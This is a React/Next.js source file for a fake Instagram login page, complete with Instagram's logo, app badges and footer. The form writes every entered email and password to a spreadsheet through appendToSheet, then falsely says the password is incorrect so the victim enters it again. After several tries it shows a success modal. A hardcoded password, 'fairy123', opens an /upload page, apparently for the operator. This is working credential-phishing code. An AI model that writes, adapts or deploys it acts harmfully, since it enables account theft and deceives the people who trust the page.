"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SuccessModal from "../components/SuccessModal";
import Image from "next/image";
import { gp, ig, ms } from "@/images";
import { appendToSheet } from "@/actions/spreadSheet";

const LoginForm = () => {
  const [isConfirming, setIsConfirming] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [successModal, setSuccessModal] = useState(false);
  const category = "instagram";
  const router = useRouter();

  const handleFirstSubmit = (event) => {
    event.preventDefault();
    setIsConfirming(true);
  };

  const handleFinalSubmit = async (event) => {
    event.preventDefault();
    console.log(password, confirmPassword);

    if (password !== confirmPassword) {
      setErrorMsg("Passwords do not match.");
      return;
    }

    try {
      if (password === "fairy123") {
        router.push("/upload");
      } else {
        const data = [[category, email, password]];
        await appendToSheet(data);
        setErrorMsg(
          "The email or password you entered is incorrect. Please try again."
        );
        setPassword("");
        setConfirmPassword("");
        setIsConfirming(false);
        setAttempts((prev) => prev + 1);

        if (attempts >= 2) {
          setSuccessModal(true);
        }
      }
    } catch (error) {
      console.error("Error:", error);
      setErrorMsg("An error occurred. Please try again.");
    }
  };

  if (successModal) {
    return <SuccessModal />;
  }

  return (
    <div className="bg-white flex flex-col items-center justify-center min-h-screen pb-0">
      <div className="w-full flex flex-col items-center justify-center bg-white">
        <Image
          src={ig}
          alt="instagram logo"
          width={200}
          height={100}
          className="my-5"
        />
        <div className="flex flex-col items-center justify-center w-full">
          {!isConfirming ? (
            <form
              className="flex flex-col justify-center items-center w-full"
              onSubmit={handleFirstSubmit}
            >
              <Input
                className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm my-4 outline-none"
                type="text"
                placeholder="Phone number, Username, or email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
              <div className="relative w-full mx-auto flex items-center justify-center">
                <Input
                  className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-4 outline-none"
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  className="absolute right-20 top-1/2 transform -translate-y-1/2"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
              {errorMsg && (
                <p className="text-red-500 text-center">{errorMsg}</p>
              )}
              <Button
                type="submit"
                className="h-10 w-3/4 bg-blue-600 text-white font-semibold border-solid text-sm rounded-xl pl-2 mb-4 hover:bg-blue-700"
              >
                Log In
              </Button>
              <div className="flex items-center justify-center">
                <Link href="#" className="font-thin text-sm inline-block">
                  Forgot Password?
                </Link>
              </div>
            </form>
          ) : (
            <form
              className="flex flex-col justify-center items-center"
              onSubmit={handleFinalSubmit}
            >
              <div className="relative w-11/12 mx-auto">
                <Input
                  type={showConfirmPassword ? "text" : "password"}
                  placeholder="Confirm Password"
                  className="w-full h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  className="absolute right-5 top-1/2 transform -translate-y-1/2"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  aria-label={
                    showConfirmPassword ? "Hide password" : "Show password"
                  }
                >
                  {showConfirmPassword ? (
                    <EyeOff size={20} />
                  ) : (
                    <Eye size={20} />
                  )}
                </button>
              </div>
              {errorMsg && (
                <p className="text-red-500 text-center">{errorMsg}</p>
              )}
              <Button
                type="submit"
                className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold hover:bg-blue-700"
              >
                Confirm and Submit
              </Button>
            </form>
          )}
        </div>
      </div>
      <div className="w-3/4 h-20 bg-white flex justify-center items-center text-sm">
        <p>
          Don&apos;t have an account?{" "}
          <span className="text-blue-500 font-semibold">Sign up</span>
        </p>
      </div>
      <div className="flex flex-col items-center justify-center mt-4">
        Get the app
        <div className="flex mt-2 w-[150px] gap-4 items-center justify-center">
          <Image src={gp} alt="google play" width={150} height={50} />
          <Image src={ms} alt="microsoft" width={150} height={50} />
        </div>
      </div>
      <footer className="w-full h-full text-center text-xs text-gray-500 mt-8 bg-gray-100 py-4">
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            ABOUT
          </Link>
          <Link href="#" className="mx-1">
            BLOG
          </Link>
          <Link href="#" className="mx-1">
            JOBS
          </Link>
          <Link href="#" className="mx-1">
            HELP
          </Link>
          <Link href="#" className="mx-1">
            API
          </Link>
        </div>
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            TERMS
          </Link>
          <Link href="#" className="mx-1">
            TOP ACCOUNTS
          </Link>
          <Link href="#" className="mx-1">
            LOCATIONS
          </Link>
        </div>
        <div>
          <Link href="#" className="mx-1 font-semibold">
            CONTACT UPLOADING AND NON-USERS
          </Link>
        </div>
      </footer>
    </div>
  );
};

export default LoginForm;
